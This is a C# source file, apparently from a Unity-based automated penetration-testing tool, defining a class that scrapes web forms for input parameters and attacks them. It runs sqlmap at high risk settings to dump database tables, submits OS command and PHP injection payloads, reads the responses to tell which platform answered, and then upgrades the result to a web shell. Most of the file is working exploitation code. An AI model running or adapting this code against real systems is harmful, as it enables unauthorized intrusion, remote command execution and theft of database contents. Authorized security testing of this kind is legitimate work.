using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using Machine;
using UnityEngine;

namespace Service.Exploit
{
    public class InputWebService : WebService
    {
        /// <summary>
        /// Local url of the input. e.g if the full url is localhost/login.php?user=polo, _relativeURL = login.php
        /// </summary>
        private string _relativeURL;
        private readonly Utils.WebMethod _method;
        private string _param;
        private readonly Dictionary<string, string> _postParams;
        public WebShell Shell = null;

        public InputWebService(Machine.Machine machine,
            string vhost,
            int port, 
            string relativeURL,
            Utils.WebMethod method, 
            string param,
            Dictionary<string, string> postParameters = null) : base(machine, port, vhost)
        {
            _relativeURL = relativeURL;
            _method = method;
            _param = param;
            _postParams = postParameters;
        }


        public static async Task<List<InputWebService>> FromLink(Machine.Machine machine, int port, string link)
        {
            List<InputWebService> list = new List<InputWebService>();
            
            Regex vhostRegex = new Regex(@"(?<=\/\/)(?'vhost'[^\/:]*):?(?'port'\d*)(?'localUrl'[^?]*)");
            string vhost = vhostRegex.Match(link).Groups["vhost"].Value;
            string localUrl = vhostRegex.Match(link).Groups["localUrl"].Value;
            
            string pageContent = web.SourceCode(link);
            
            Utils.WebMethod method = Utils.WebMethod.GET;
            
            Regex actionRegex = new Regex(
                @"(?<=<form method=""get"" action="").*?(?="">)",
                RegexOptions.Singleline);
            
            Regex paramsNameRegex = new Regex(
                @"((<input type=""((text)|(password)|(submit))"" name=""(?'name'.*?)""( value=""(?'value'.*?)"")?.*?>).*?)",
                RegexOptions.Singleline
                );
            
            if (actionRegex.IsMatch(pageContent))
            {
                localUrl = actionRegex.Match(pageContent).Value;
            }
            
            List<(string,string)> paramNames = new List<(string,string)>();
            foreach (Match match in paramsNameRegex.Matches(pageContent))
            {
                if (match.Groups["name"].Value != "")
                {
                    (string, string) param = (match.Groups["name"].Value, "EXPLOIT");
                    if (match.Groups["value"].Value != "")
                        param.Item2 = match.Groups["value"].Value;
                    paramNames.Add(param);
                }
            }

            if (paramNames.Count > 0)
                localUrl += "?";
            // We can overload the get parameters.
            foreach ((string, string) paramTuple in paramNames)
            {
                localUrl += $"{paramTuple.Item1}={paramTuple.Item2}&";
            }

            foreach ((string, string) paramTuple in paramNames)
            {
                    InputWebService inputWebService = new InputWebService(
                        machine,
                        vhost,
                        port,
                        localUrl,
                        method,
                        paramTuple.Item1
                    );

                    list.Add(inputWebService);
            }

            return list;
        }
        
        public string GetUrl()
        {
            return _relativeURL;
        }
        
        public string GetParam()
        {
            return _param;
        }
        
        public async Task<string> Submit(string value)
        {
            switch (_method)
            {
                case (Utils.WebMethod.GET):
                    string s = $"{HttpUtility.UrlEncode(_param)}={HttpUtility.UrlEncode(value)}";
                    string separator = _relativeURL.Contains("?") ? "&" : "?";
                    string result = await Get(_relativeURL + separator + s);
                    return result;

                case (Utils.WebMethod.POST):
                    Dictionary<string, string> toSend = new Dictionary<string, string>();
                    foreach (KeyValuePair<string, string> pair in _postParams)
                    {
                        toSend.Add(pair.Key, pair.Value);
                    }

                    toSend.Add(_param, value);
                    return await Post(_relativeURL, content: toSend);

                default:
                    throw new NotImplementedException($"The method {_method} is not yet implemented.");
            }
        }

        public async Task Exploit(bool wait = false)
        {
            Debug.Log($"{GetIP()}:{GetPort()}: Start of web exploitation");
            //Thread sqlInjectionThread = SQLInjection();
            await AsyncCommandInjection();
            
            if (wait)
            {
              //  sqlInjectionThread.Join();
            }
            Debug.Log($"{GetIP()}:{GetPort()}: End of web exploitation");
        }
        
        public Thread SQLInjection()
        {
            Thread thread = new Thread(ThreadedSQLInjection);
            thread.Start();
            return thread;
        }
        

        public void ThreadedSQLInjection()
        {
            if (!Utils.IsProgrammInstalled("python"))
                return;
                    
            string sqlmap = "python " + Path.Combine("Binaries", "sqlmap", "sqlmap.py");
            string outputdir = Path.Combine("Results", GetIP().ToString(), GetPort().ToString(), "SQLi");
            string options = $"--level=2 --risk=3 -v 0 --dump --technique=BEQSU --batch -o --output-dir={outputdir}";
            string command = $"{sqlmap} {options} -u \"{GetIP()}:{GetPort()}/{_relativeURL}{_param}=*\"";

            // Debug.Log(command);
            command.Exec();
            
            // Cleanup
            foreach (string file in Directory.GetFiles(outputdir, "results*.csv"))
            {
                File.Delete(file);
            }
            File.Delete(Path.Combine(outputdir, "log"));
            File.Delete(Path.Combine(outputdir, "session.sqlite"));

            
            string[] databases = Directory.GetFiles(outputdir, "*.csv", SearchOption.AllDirectories);
            if (databases.Length > 0)
            {
                string db = databases[0];
                string[] tmp = db.Split(Path.DirectorySeparatorChar);
                string tableName = tmp[tmp.Length - 1];
                tableName = tableName.Replace(".csv", "");
                AccessPoint accessPoint = new AccessPoint(_relativeURL, $"{_relativeURL}?{_param}=' UNION SELECT * FROM {tableName}", AccessPointType.SQLi, 7);
                Log(accessPoint);
                
                string dumpDir = Path.Combine(WorkingDirectory, "dump");
                Directory.CreateDirectory(dumpDir);
                foreach (string databasePath in databases)
                {
                    tmp = databasePath.Split(Path.DirectorySeparatorChar);
                    tableName = tmp[tmp.Length - 1];
                    
                    if (File.Exists(Path.Combine(dumpDir, tableName)))	
                        File.Delete(Path.Combine(dumpDir, tableName));
                    
                    File.Move(databasePath, Path.Combine(dumpDir,tableName));
                }
            }
        }

        public async Task AsyncCommandInjection()
        {
           
            // Try for OS command injection
            string payload = "1 & (echo $PATH)";
            string result = await Submit(payload);
            
            Debug.Log(result);
            
            Regex windowsRegex = new Regex("(?<!echo )\\$PATH");
            Regex linuxRegex = new Regex("/usr/sbin:/usr/bin:/sbin:/bin"); //TODO: Allow a change in order of the parameters. Not required but could be fun.

            ShellType shellType = ShellType.None;
            //Debug.Log("Is it an os webshell ?");
            //Debug.Log(result);
            if (windowsRegex.IsMatch(result))
            {
                Debug.Log("Windows !");
                shellType = ShellType.Windows;
            }

            if (linuxRegex.IsMatch(result))
            {
                Debug.Log("Linux or MacOS: Unix");
                shellType = ShellType.Linux;
            }
            
            // PHP Injection ?
            payload = ";var_dump(\"SECU\" . \"Studio\");";
            result = await Submit(payload);
            string escapedParenthesis = Regex.Escape("(");
            Regex PHPRegex = new Regex(
                  "(?<!var_dump" + escapedParenthesis + "\")"
                + "(?<!var_dump" + escapedParenthesis + ")"
                + "SECUStudio"
                );
            if (PHPRegex.IsMatch(result))
            {
                shellType = ShellType.Php;
                Debug.Log("PHP Shell");
            }

            if (shellType != ShellType.None)
            {
                WebShell shell = new WebShell(this, shellType, false);
                shell.Upgrade();
                Shell = shell;
            }
            else
            {
                Debug.Log("No shell found.");
            }
        }
    }
}